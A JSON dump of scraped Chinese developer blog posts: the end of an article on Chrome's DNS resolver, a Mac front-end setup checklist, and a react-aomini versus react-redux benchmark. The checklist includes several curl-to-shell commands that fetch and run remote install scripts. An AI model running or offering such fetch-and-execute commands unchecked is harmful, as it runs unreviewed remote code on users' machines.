src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7bd5cf2849?w=960\u0026amp;h=292\u0026amp;f=png\u0026amp;s=16910\"\u003e\u003c/p\u003e\u003cp\u003e当前域名的TTL值为600s即10分钟。这个可以在买域名的提供商进行设置：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7bd5ded482?w=1588\u0026amp;h=168\u0026amp;f=png\u0026amp;s=24819\"\u003e\u003c/p\u003e\u003cp\u003e另外可以看到这个记录类型是A的，什么是A呢，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7bd698f424?w=1438\u0026amp;h=782\u0026amp;f=png\u0026amp;s=46367\"\u003e\u003c/p\u003e\u003cp\u003e在添加解析的时候可以看到，A就是把域名解析到一个IPv4地址，而AAAA是解析到IPv6地址，CNAME是解析到另外一个域名。使用CNAME的好处是当很多其它域名指向一个CNAME时，当需要改变IP地址时，只要改变这个CNAME的地址，那么其它的也跟着生效了，但是得做二次解析。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e如果域名在本地不能解析的话，Chrome就会去发请求了。操作系统提供了一个叫getaddrinfo的系统函数用来做域名解析，但是Chrome并没有使用，而是自己实现了一个DNS客户端，包括封装DNS request报文以及解析DNS response报文。这样可能是因为灵活度会更大一点，例如Chrome可以自行决定怎么用nameservers，顺序以及失败尝试的次数等。\u003c/p\u003e\u003cp\u003e在resolver的startJob里面启动解析。取到下一个queryId，然后构建一个query，再构建一个DnsUDPAttempt，再执行它的start，因为DNS客户端查询使用的是UDP报文（辅域名服务器向主域名服务器查询是用的TCP）：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003euint16_t\u003c/span\u003e id = session_-\u0026gt;NextQueryId();\n\u003cspan class=\"hljs-built_in\"\u003estd\u003c/span\u003e::\u003cspan class=\"hljs-built_in\"\u003eunique_ptr\u003c/span\u003e\u0026lt;DnsQuery\u0026gt; query;\nquery.reset(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e DnsQuery(id, qnames_.front(), qtype_, opt_rdata_));\n\nDnsUDPAttempt* attempt =\n    \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e DnsUDPAttempt(server_index, \u003cspan class=\"hljs-built_in\"\u003estd\u003c/span\u003e::move(lease), \u003cspan class=\"hljs-built_in\"\u003estd\u003c/span\u003e::move(query));\n\u003cspan class=\"hljs-keyword\"\u003eint\u003c/span\u003e rv = attempt-\u0026gt;Start(\n    base::Bind(\u0026amp;DnsTransactionImpl::OnUdpAttemptComplete,\n               base::Unretained(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e), attempt_number,\n               base::TimeTicks::Now()));\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e具体解析的过程拆成了几步，这个代码组织是这样的，通过一个state决定执行顺序：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003eint\u003c/span\u003e rv = result;\n\u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e {\n  \u003cspan class=\"hljs-comment\"\u003e// 最开始的state为STATE_SEND_QUERY\u003c/span\u003e\n  State state = next_state_;\n  next_state_ = STATE_NONE;\n  \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e (state) {\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e STATE_SEND_QUERY:\n      rv = DoSendQuery();\n      \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e STATE_SEND_QUERY_COMPLETE:\n      rv = DoSendQueryComplete(rv);\n      \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e STATE_READ_RESPONSE:\n      rv = DoReadResponse();\n      \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e STATE_READ_RESPONSE_COMPLETE:\n      rv = DoReadResponseComplete(rv);\n      \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e:\n      NOTREACHED();\n      \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n  }\n} \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (rv != ERR_IO_PENDING \u0026amp;\u0026amp; next_state_ != STATE_NONE);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003estate从第一个case执行完之后变成第二个case的state，在第二个case的执行函数里面又把它改成第三个，这样依次下来，直到变成while循环里面的STATE_DONE，或者是ERR状态结束当前transaction事务。所以这个代码组织还是比较有趣的。\u003c/p\u003e\u003cp\u003e最后解析成功之后，会把结果放到cache里面：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (did_complete) {\n      resolver_-\u0026gt;CacheResult(key_, entry, ttl);\n      RecordJobHistograms(entry.error());\n    }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后生成一个addressList，传递给相应的callback，因为DNS解析可能会返回多个结果，如下面这个：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7bd6b43cd4?w=1136\u0026amp;h=514\u0026amp;f=png\u0026amp;s=35147\"\u003e\u003c/p\u003e\u003cp\u003e这里我们没用Chrome打印结果了，都是直接看的wireshark的输出，因为添加打印函数比较麻烦，直接看wireshark的输出比较直观，节省时间。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e本文简单地介绍了DNS解析的过程以及DNS的一些相关概念，相信到这里，应该可以回答上面提出的几个问题了。总地来说，客户端向域名解析服务器发起查询，然后服务器返回响应。DNS服务器nameservers是在设备接入网络的时候路由器通过DHCP发给设备的，chrome会按照nameservers的顺序发起查询，并将结果缓存，有效时间根据ttl，有效期内两次查询直接使用cache。DNS解析的结果有几种类型，最常见的是A记录和CNAME记录，A记录表示结果是一个IP地址，CNAME表示结果是另外一个域名。\u003c/p\u003e\u003cp\u003e本文没有很深入详细地介绍，但是核心的概念和逻辑过程应该是都有涉及了。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514893414.8351","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e924"},"id":"5a4909c86fb9a044fe46b696","author":{"$oid":"5a4b765a751bf823c002e91e"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"新年新起点：从零配置 Mac 前端环境速查","meta":{"likeCount":0},"tag":["Mac","前端"],"comment":[],"shortContent":"如果新年你准备换台 Mac、重装 Mac 系统或者升级老 Mac 硬盘，这篇文章或许能成为一份不错的 Checklist 哦。 编写这篇指南的契机是笔者的 Mac 刚刚换了 SSD，又需要重装系统了……上一次换工作的时候也重装过一次，而 Mac 相关工具链的配置每次都比之前显得…","content":"\u003cp\u003e如果新年你准备换台 Mac、重装 Mac 系统或者升级老 Mac 硬盘，这篇文章或许能成为一份不错的 Checklist 哦。\u003c/p\u003e\n\n\u003cp\u003e编写这篇指南的契机是笔者的 Mac 刚刚换了 SSD，又需要重装系统了……上一次换工作的时候也重装过一次，而 Mac 相关工具链的配置每次都比之前显得更加繁琐。因此这里整理出把它配置到面向前端开发者趁手状态的通用性工具的\u003cstrong\u003e最小集合\u003c/strong\u003e，仅供参考哦。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e点击下文子项标题可直接定位到相应工具官网。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e命令行工具\u003c/h2\u003e\n\u003cp\u003e下面几项是必备的命令行工具，甚至可以建议团队强制统一使用。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://github.com/robbyrussell/oh-my-zsh\"\u003eoh-my-zsh\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e省心的终端，命令行安装即可：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003esh -c \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u003c/span\u003e\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"http://railsapps.github.io/xcode-command-line-tools.html\"\u003eXCode 开发者工具\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e在安装 Oh My Zsh 时会自动提示安装，否则无法使用 \u003ccode\u003egit\u003c/code\u003e / \u003ccode\u003egcc\u003c/code\u003e 等命令。手动安装方式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003excode-select -p\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eGit 能用以后，记得在 \u003ccode\u003e~/.ssh\u003c/code\u003e 里配置好公钥，并用 \u003ccode\u003egit config --global --edit\u003c/code\u003e 配置好你的名字哦。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://brew.sh\"\u003eHomebrew\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eMac 上流行的包管理器，同样终端安装。安装后终端查看 \u003ccode\u003ebrew\u003c/code\u003e 命令即可确认状态。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/usr/bin/ruby \u003cspan class=\"hljs-_\"\u003e-e\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\u003c/span\u003e\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://github.com/creationix/nvm\"\u003eNVM\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e非常建议使用 nvm 管理 node 版本，而非直接安装 node.js 官网的 \u003ccode\u003epkg\u003c/code\u003e 安装包。安装方式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ecurl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.8/install.sh | bash\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://nodejs.org\"\u003eNode\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e安装 NVM 后，\u003ccode\u003envm ls-remote\u003c/code\u003e 查看版本，\u003ccode\u003envm install xxx\u003c/code\u003e 安装你想要的版本即可。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://github.com/cnpm/cnpm\"\u003eCNPM\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e稳定的国内镜像，安装完成 Node 后，\u003ccode\u003enpm install -g cnpm\u003c/code\u003e 即可。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eGUI 插件\u003c/h2\u003e\n\u003cp\u003e这类插件的共同特点是非常影响 GUI 行为，且平时根本不需要打开。虽然这类插件有很多，但\u003cstrong\u003e过多使用此类插件会使得你在使用同事的 Mac 时都非常不习惯\u003c/strong\u003e。因此仅列出两个个人评价最高的：\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"zipzapmac.com/Go2Shell\"\u003eGo2Shell\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e支持从 Finder 一键打开终端，和 \u003ccode\u003eopen .\u003c/code\u003e 命令互补起来非常方便。\u003c/p\u003e\n\u003cp\u003e这个软件安装时很容易抽风，不妨尝试在 Finder 工具栏上右键选择 \u003ccode\u003e图标和文本\u003c/code\u003e 并来回切换来增加安装成功率……\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://www.boastr.net/\"\u003eBetter Touch Tool\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e它自带了类似 Win7 的窗口左右分屏功能，还可以配置在按下 \u003ccode\u003ectrl\u003c/code\u003e 时移动鼠标直接缩放当前窗口，\u003cstrong\u003e非常非常\u003c/strong\u003e适合前端同学调试响应式布局……配置方式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e-\u0026gt; Advanced\n-\u0026gt; Advanced Settings\n-\u0026gt; Window Moving \u0026amp; Resizing\n-\u0026gt; 勾选某个快捷键，如 ctrl\n-\u0026gt; 关掉其它无用配置，如自动更新、Menubar 图标等\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003eGUI 开发者应用\u003c/h2\u003e\n\u003cp\u003e前端要干活的\u003cstrong\u003e最小依赖\u003c/strong\u003e只有这么两个：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eChrome 等浏览器及相关插件（这部分可以单独开一篇文章梳理）。\u003c/li\u003e\n\u003cli\u003eVSCode 等编辑器及相关插件（同样足够单独开文章梳理）。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003eGUI 日常应用\u003c/h2\u003e\n\u003cp\u003e这类应用非常多，在此只列出笔者个人最常用的若干，以免感觉\u003cstrong\u003e装漏了什么\u003c/strong\u003e……\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e输入法\u003c/li\u003e\n\u003cli\u003eQQ / Wechat\u003c/li\u003e\n\u003cli\u003eThunder / 云盘\u003c/li\u003e\n\u003cli\u003eIINA 播放器\u003c/li\u003e\n\u003cli\u003ePhotoShop\u003c/li\u003e\n\u003cli\u003eOffice\u003c/li\u003e\n\u003cli\u003eMarkdown 编辑器（如 MacDown 或 Typora）\u003c/li\u003e\n\u003cli\u003e\u003cdel\u003eSS 客户端\u003c/del\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e系统配置定制\u003c/h2\u003e\n\u003cp\u003e这部分内容非常因人而异，笔者个人偏好包括这么几项：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e启用 Finder 暗色主题\u003c/li\u003e\n\u003cli\u003e开启触摸板的三指拖拽和轻触点击\u003c/li\u003e\n\u003cli\u003e清理 Dock 无用图标，归类 Launchpad 到一页内\u003c/li\u003e\n\u003cli\u003e清理通知中心\u003c/li\u003e\n\u003cli\u003eF1 ~ F12 由功能键换成 Fn 键\u003c/li\u003e\n\u003cli\u003e配置 Finder 左侧的快捷入口，并把默认目录改为 \u003ccode\u003e下载\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e配置终端主题\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003eWrap up\u003c/h2\u003e\n\u003cp\u003e还不够多吗？折腾一个全新安装的桌面系统确实需要不少时间精力，并且也没有类似 Docker 这样的高效工具。因此这里只列出尽可能少而直接的内容，希望对大家有所帮助~若有遗漏或补充，欢迎指出哦 😀\u003c/p\u003e\n","buildTime":"1514894463.6993","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e923"},"id":"5a47082f6fb9a044fb081740","author":{"$oid":"5a4b765a751bf823c002e913"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/10/12/53978fad00575e301ae77c5202de84bc","https://user-gold-cdn.xitu.io/2017/10/12/ed485e263a75377d4f307c4b52b57f8b","https://user-gold-cdn.xitu.io/2017/10/12/517b7d491ca9ace60562ed1b34fe32d9","https://user-gold-cdn.xitu.io/2017/10/12/56ee22c7800a0a49e78625b9ebdd7c49"],"screenShot":null}],"title":"react-aomini（第三弹），赢在小巧，性能方面，干翻react-redux还是可以的","meta":{"likeCount":0},"tag":["React.js","Redux","前端","JavaScript"],"comment":[],"shortContent":"到目前为止，react-aomini最大的特点就是简单粗暴（react-aomini是个人写的一个谈不上框架的小框架，不了解的可以看看我之前写的两篇博文，react-redux？mobx？或许我需要更加小巧玲珑的和小巧玲珑的react框架（第二弹）正式命名--aomini），大…","content":"\u003cp\u003e到目前为止，react-aomini最大的特点就是简单粗暴（react-aomini是个人写的一个谈不上框架的小框架，不了解的可以看看我之前写的两篇博文，\u003ca target=\"_blank\" href=\"https://juejin.im/post/59c5b2936fb9a00a4b0c54fc\"\u003ereact-redux？mobx？或许我需要更加小巧玲珑的\u003c/a\u003e和\u003ca target=\"_blank\" href=\"https://juejin.im/post/59cf7258f265da064c388852\"\u003e小巧玲珑的react框架（第二弹）正式命名--aomini\u003c/a\u003e），大家感兴趣的可以从\u003ca target=\"_blank\" href=\"https://github.com/FE-xiaoJiang/aomini.git\"\u003ereact-aomini github\u003c/a\u003e签出代码看看，代码写的也没拾掇过，见笑见笑，看个思路，简单轻量是实现了，但是大家还是会疑惑，那真的能投入实战吗，性能到底咋样呢？实不相瞒，我个人也是比较好奇，毕竟我也没有测试过，不过我还是蛮有信心的，因为轻量就是不为求全，只为解决最尖锐的那个问题，所以最接近原生，原生肯定比在外面套层外套跑的快啦，所以相信react-aomini不会太挫，不过说是这么说，还是要数据来说话。\n为了结果更加有参考意义，我们就拿当下最流行的react-redux框架来进行性能对比，react-aomini和react-redux作为实验组，并加入react原生作为参照组。我们的性能测试对比主要是采用控制三个不同的框架作为唯一变量进行实验，三个实验对象中对同一个模块进行相同数量级的调用，分别记录耗时数据。\n接下来简要说明一下我们的实验，我们会对每个实验体（也就是react-aomini，react和react-redux）分别进行百级、千级、万级以及十万级的模块加载，然后分别对所有模块进行更新操作，模块加载暂不作为统计数据，我们取更新操作的耗时作为实验数据，每组取十个数据作为一组。为了方便起见，我使用其中最简单的react原生代码进行实验说明，代码如下：\nModule1.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass Module1 extends React.Component{\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003econstructor\u003c/span\u003e\u003c/span\u003e(){\n\u0009\u0009super();\n\u0009\u0009this.state = {\n\u0009\u0009\u0009moduleQuantity:900\n\u0009\u0009};\n\u0009}\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e { moduleQuantity } = this.props;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009\u0009\u0009\u0026lt;div\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;p\u0026gt;--------Module1---------\u0026lt;/p\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;input \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"number\"\u003c/span\u003e value={moduleQuantity} onChange={this.setValue.bind(this)} /\u0026gt;\n\u0009\u0009\u0009\u0026lt;/div\u0026gt;\n\u0009\u0009\u0009)\n\u0009}\n\u0009componentDidUpdate(prevProps, prevState) {\n\u0009\u0009console.log(\u003cspan class=\"hljs-string\"\u003e\"Module1 did update\"\u003c/span\u003e)\n\u0009}\n\u0009\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eValue(e){\n\u0009\u0009console.log(e.target.value);\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e { \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eModuleQuantity } = this.props;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eModuleQuantity(e.target.value);\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eMoudleX.js代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n* siblings2\n*/\nclass ModuleX extends React.Component{\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003econstructor\u003c/span\u003e\u003c/span\u003e(){\n\u0009\u0009super();\n\u0009\u0009this.startTime = 0;\n\u0009\u0009this.state = {\n\u0009\u0009\u0009updateCount:1\n\u0009\u0009};\n\u0009}\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e {moduleQuantity} = this.props;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e { updateCount } = this.state;\n\u0009\u0009console.log(\u003cspan class=\"hljs-string\"\u003e\"\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\"\u003c/span\u003e,updateCount)\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e subNum = Number(moduleQuantity || 0);\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009\u0009\u0009\u0026lt;div\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;p\u0026gt;---------ModuleX---------\u0026lt;/p\u0026gt;\n\u0009\u0009\u0009\u0009兄弟节点Module1的值:{moduleQuantity}\n\u0009\u0009\u0009\u0009\u0026lt;button onClick={this.updateX.bind(this)}\u0026gt;更新\u0026lt;/button\u0026gt;\n\u0009\u0009\u0009\u0009{\n\u0009\u0009\u0009\u0009\u0009subNum \u0026lt;= 0 ? \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e:(\n\u0009\u0009\u0009\u0009\u0009\u0009Array(subNum).fill(1).map((item,i)=\u0026gt;{\n\u0009\u0009\u0009\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009\u0009\u0009\u0009\u0009\u0009\u0009\u0009\u0026lt;SubModuleX key={i} mIndex={i+1} updateCount={updateCount} /\u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0009\u0009)\n\u0009\u0009\u0009\u0009\u0009\u0009})\n\u0009\u0009\u0009\u0009\u0009)\n\u0009\u0009\u0009\u0009}\n\u0009\u0009\u0009\u0026lt;/div\u0026gt;\n\u0009\u0009\u0009)\n\u0009}\n\u0009componentWillUpdate(nextProps, nextState) {\n\u0009\u0009this.startTime = new Date().getTime();\n\u0009\u0009console.log(\u003cspan class=\"hljs-string\"\u003e\"ModuleX will update\"\u003c/span\u003e)\n\u0009}\n\u0009componentDidUpdate(prevProps, prevState) {\n\u0009\u0009console.log(\u003cspan class=\"hljs-string\"\u003e\"ModuleX did update using time:\"\u003c/span\u003e,new Date().getTime() - this.startTime)\n\u0009}\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eupdateX\u003c/span\u003e\u003c/span\u003e(){\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e { updateCount } = this.state;\n\u0009\u0009this.setState({\n\u0009\u0009\u0009updateCount:updateCount+1\n\u0009\u0009});\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最重要的一个实验模块SubModuleX代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass SubModuleX extends React.Component{\n\u0009constructor(props) {\n\u0009\u0009super(props);\n\u0009\u0009this.state = {};\n\u0009}\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e { mIndex, updateCount } = this.props;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;div\u0026gt;sub module {mIndex},update count:{updateCount}\u0026lt;/div\u0026gt;\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eApp.js文件如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass App extends React.Component{\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003econstructor\u003c/span\u003e\u003c/span\u003e(){\n        super();\n        this.name = \u003cspan class=\"hljs-string\"\u003e\"App\"\u003c/span\u003e;\n        this.state = {\n            moduleQuantity:900\n        }\n    }\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e {moduleQuantity} = this.state;\n        console.log(\u003cspan class=\"hljs-string\"\u003e\"moduleQuantity:\"\u003c/span\u003e,moduleQuantity)\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n            \u0026lt;div\u0026gt;\n                \u0026lt;Module1 moduleQuantity={moduleQuantity} \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eModuleQuantity={this.setModuleQuantity.bind(this)} /\u0026gt;\n                \u0026lt;ModuleX moduleQuantity={moduleQuantity} /\u0026gt;\n            \u0026lt;/div\u0026gt;\n            )\n    }\n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eModuleQuantity(moduleQuantity){\n        this.setState({\n            moduleQuantity\n        })\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e实验代码如上简要说明一下，十分简单。其中Module1模块主要是一个moduleQuantity的输入框，也就是控制实验数量的一个输入，ModuleX模块中获取moduleQuantity后，对SubModuleX进行循环装载，模块加载完后，才算是准备好进行实验，这里注意，我们并没有将模块的加载耗时作为实验数据，而是将更新模块耗时作为实验数据。\n为了数据更具有参考意义，这里贴一下我实验环境参数：mac pro，单核 i7处理器2.4GHz，8G内存，google浏览器最新版本61.0.3163.100。\n开始我们的实验后，我们只需要点击ModuleX中的更新按钮，所有模块更新完毕后，会打印出每次的耗时。我们将实验结果记录并绘成折线图，结果如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/10/12/53978fad00575e301ae77c5202de84bc\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/10/12/ed485e263a75377d4f307c4b52b57f8b\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/10/12/517b7d491ca9ace60562ed1b34fe32d9\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/10/12/56ee22c7800a0a49e78625b9ebdd7c49\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n以上结果可以看出，在千级模块调用内，耗时几乎都在100毫秒内，差距并不大，在实际开发中感受必定不明显，但是已经一目了然。随着数量级的增大，到了万级的模块调用，性能明显进一步拉大，react均值在450ms，react-aomini的均值在600ms，而react-redux在800ms上下。此后，数量级规模越大，差距拉开也加大，十万级调用中，react-redux均值在13s以上，比react-aomini耗时多出将近6s。\n从以上实验结果可以得出，react原生是最快的，而披上了一件毛皮大衣的react-redux意料之中垫了底，react-aomini披上一件小背心轻装上阵，性能还是可喜的。\n所以以上可以得出两个结论：\n1、react-aomini性能没有问题，可以放心投入生产；\n2、毕竟十万级的模块数量的大工程本来已经不多了，况且是同时对所有模块进行更新就更加不可能了，所以react-redux即使披了件大外衣很重，但并没有太影响它的机能，所以选用哪个框架，性能问题可以不用过多关注啦。\n实验结果摆在这了，秒杀react-redux，react-aomini还是没有问题滴，毕竟小巧玲珑还是有一定优势的。\n不过作为开发者不能盲目吹嘘，这个项目不是为了跟react-redux进行pk而生的，是为了解决react-redux开发路径过长的问题，适用于微小型的项目，这个设计初衷只是便于状态的管理，为了保持微小项目的灵活性和开发便捷性，大型项目还是不太适用的，容易造成代码的不清晰。\n好了，代码会进行持续优化，感兴趣的话就持续关注吧。\u003cp\u003e\u003c/p\u003e\n","buildTime":"1514894716.217","__v":0}
